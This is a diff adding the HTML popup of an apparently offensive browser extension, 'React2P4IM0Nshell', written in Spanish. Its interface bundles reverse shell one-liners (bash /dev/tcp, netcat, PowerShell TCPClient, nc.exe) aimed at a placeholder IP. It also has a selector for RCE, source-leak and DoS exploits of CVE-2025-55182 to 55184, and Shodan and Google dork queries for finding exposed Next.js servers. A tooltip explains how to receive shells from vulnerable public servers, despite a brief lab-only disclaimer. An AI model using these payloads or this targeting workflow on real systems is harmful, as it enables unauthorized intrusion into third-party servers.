@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>React2P4IM0Nshell</title>
+    <link rel="stylesheet" href="popup.css">
+</head>
+<body>
+    <div class="linea-escaner"></div>
+    
+    <div class="contenedor-maestro">
+        <!-- PANEL IZQUIERDO: TERMINAL (Oculto por defecto) -->
+        <div id="panel-terminal" class="panel-lateral">
+            <div class="terminal-header">
+                <span class="icono">💻</span> ARCH_LINUX_V86
+                <button id="btnCerrarTerminal" class="btn-mini">X</button>
+            </div>
+            <div class="terminal-frame-container">
+                <div id="placeholder-terminal" class="terminal-loading">
+                    INICIALIZANDO SISTEMA V86...
+                </div>
+            </div>
+        </div>
+
+        <!-- PANEL DERECHO: INTERFAZ ORIGINAL -->
+        <div class="marco-principal">
+            <div class="cabecera">
+                <div class="area-logo">
+                    <img src="images/icon.png" onerror="this.style.display='none'" class="img-glitch">
+                    <span class="titulo">React2P4IM0Nshell</span>
+                </div>
+                <div class="subtitulo">v3.7 // por P4IM0N</div>
+            </div>
+
+            <!-- SISTEMA DE NAVEGACIÓN -->
+            <div class="nav-tabs">
+                <button class="nav-tab activo" data-target="vista-principal">CMD_CENTER</button>
+                <button class="nav-tab" data-target="vista-recon">RECON 📡</button>
+            </div>
+
+            <!-- VISTA 1: CENTRO DE MANDO -->
+            <div id="vista-principal" class="vista-panel">
+                <div class="terminal">
+                    
+                    <!-- Módulo 1 -->
+                    <div class="bloque-modulo">
+                        <div class="cabecera-modulo">
+                            <span class="icono">👁️</span> RECONOCIMIENTO_PASIVO
+                            <span id="insignia-pasiva" class="insignia-estado parpadeo">ESCANIEANDO...</span>
+                        </div>
+                        <div class="contenido-modulo">
+                            <ul id="lista-pasiva" class="texto-consola">
+                                <li>> Inicializando enlace neural...</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <!-- Módulo 2 -->
+                    <div class="bloque-modulo">
+                        <div class="cabecera-modulo">
+                            <span class="icono">📡</span> SONDA_ACTIVA (RSC:1)
+                        </div>
+                        <div class="contenido-modulo">
+                            <button id="btnHuella" class="btn-ciber">INICIAR HANDSHAKE</button>
+                            <div id="resultado-huella" class="resultado-oculto">
+                                <ul id="lista-activa" class="texto-consola"></ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Módulo 3: Explotación -->
+                    <div class="bloque-modulo zona-peligro">
+                        <div class="cabecera-modulo texto-error" style="display: flex; justify-content: space-between; align-items: center;">
+                            <span><span class="icono">💀</span> MODULO_EXPLOTACION</span>
+                            
+                            <div class="botones-header">
+                                <!-- BOTÓN PAYLOADS -->
+                                <div class="payload-wrapper">
+                                    <button id="btnPayloads" class="btn-mini-term btn-payload" title="Generar Reverse Shells">
+                                        Payload Rshell ▼
+                                    </button>
+                                    <div id="menuPayloads" class="menu-payloads" style="display:none;">
+                                        <div class="payload-group">
+                                            <div class="payload-label">LINUX</div>
+                                            <div class="payload-item" data-code="bash -i >& /dev/tcp/TU_IP/8889 0>&1">Bash TCP</div>
+                                            <div class="payload-item" data-code="mkfifo /tmp/f; nc TU_IP 8889 < /tmp/f | /bin/sh > /tmp/f 2>&1">Netcat Pipe</div>
+                                        </div>
+                                        <div class="payload-group">
+                                            <div class="payload-label">WINDOWS</div>
+                                            <div class="payload-item" data-code="powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;$c=New-Object Net.Sockets.TCPClient('TU_IP',8889);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}&quot;">PowerShell</div>
+                                            <div class="payload-item" data-code="nc.exe TU_IP 8889 -e cmd.exe">Netcat.exe</div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- BOTÓN TERMINAL -->
+                                <div class="tooltip-wrapper">
+                                    <button id="btnAbrirTerminal" class="btn-mini-term">
+                                        <span class="blink">>_</span> TERMINAL
+                                    </button>
+                                    <span class="tooltip-text">
+                                        La terminal es funcional y tiene conexión a internet, pero para recibir una reverse shell de un web server vulnerable público deberás conectarte por SSH a tu Kali y configurar port forwarding en tu router o más fácil conectarte por SSH a tu IP pública de tu celular NetHunter.
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="caja-selector">
+                            <select id="selectorExploit" class="input-ciber">
+                                <option value="CVE-2025-55182">CVE-2025-55182 (RCE)</option>
+                                <option value="CVE-2025-55183">CVE-2025-55183 (Source Leak)</option>
+                                <!-- INTEGRACIÓN NUEVA: CVE-2025-55184 (DoS) -->
+                                <option value="CVE-2025-55184">CVE-2025-55184 (DoS Attack)</option>
+                            </select>
+                        </div>
+                        <div class="grupo-input">
+                            <span class="prompt">$</span>
+                            <input type="text" id="entradaComando" class="input-ciber" placeholder="whoami (Solo para RCE)" value="whoami">
+                            <button id="btnExploit" class="btn-ciber btn-peligro">EJECUTAR</button>
+                        </div>
+                        
+                        <div id="estado-exploit" class="linea-estado">Inyectando Payload...</div>
+                        
+                        <div id="resultado-exploit" class="salida-consola">
+                            <pre id="salida-rce">ESPERANDO ENTRADA...</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- VISTA 2: RADAR DE CAZA -->
+            <div id="vista-recon" class="vista-panel" style="display:none;">
+                <div class="terminal">
+                    <!-- SECCIÓN GOOGLE NEURAL -->
+                    <div class="bloque-modulo">
+                        <div class="cabecera-modulo">
+                            <span class="icono">🤖</span> GOOGLE_NEURAL_UPLINK
+                        </div>
+                        <div class="contenido-modulo">
+                            <input type="password" id="geminiToken" class="input-ciber" placeholder="PEGAR GEMINI API TOKEN">
+                            <div class="texto-mini">Caza automática vía Google Search Grounding.</div>
+                        </div>
+                    </div>
+
+                    <div class="bloque-modulo zona-caza">
+                        <div class="cabecera-modulo" style="color:#ffae00">
+                            <span class="icono">🎯</span> TARGETING_AUTOMATICO
+                        </div>
+                        <div class="caja-selector">
+                            <select id="selectorDork" class="input-ciber">
+                                <option value='http.component:"Next.js" + 200'>Next.js Apps (Public Exposed)</option>
+                                <option value='http.title:"Next.js" + country:"US"'>Next.js Systems (US Region)</option>
+                                <option value='http.html:"_next/static" + 200'>Next.js Static Assets (Deep)</option>
+                                <option value='product:"Next.js"'>Product Signature Scan</option>
+                            </select>
+                        </div>
+                        <button id="btnCazar" class="btn-ciber btn-caza">EJECUTAR GOOGLE DORKING</button>
+                    </div>
+                    
+                    <!-- SECCIÓN SHODAN DIRECT -->
+                    <div class="bloque-modulo" style="border-color: #cc2b2b;">
+                        <div class="cabecera-modulo" style="color:#cc2b2b">
+                            <span class="icono">🔭</span> SHODAN_LINK_MANUAL
+                        </div>
+                        <div class="contenido-modulo" style="text-align: center;">
+                            <button id="btnShodan" class="btn-ciber" style="border-color: #cc2b2b; color: #cc2b2b;">CAZA SHODAN</button>
+                            <div class="texto-mini" style="margin-top:5px; color:#888;">(Requiere estar logueado en shodan.io)</div>
+                        </div>
+                    </div>
+
+                    <div id="resultado-caza" class="salida-consola">
+                        <div class="cabecera-resultados">> OBJETIVOS VIVOS (GOOGLE INDEX):</div>
+                        <div id="lista-ips" class="grid-ips">
+                            <div class="mensaje-espera">ESPERANDO ORDEN...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pie-pagina">
+                <!-- AVISO ÉTICO -->
+                <div class="aviso-etico" title="Herramienta educativa para pruebas de seguridad autorizadas. El creador no se responsabiliza del mal uso.">
+                    <span class="luz-etica"></span> Uso ético responsable para laboratorios propios
+                </div>
+                SISTEMA LISTO. <span class="parpadeo">_</span>
+            </div>
+        </div>
+    </div>
+    <script src="popup.js"></script>
+</body>
+</html>
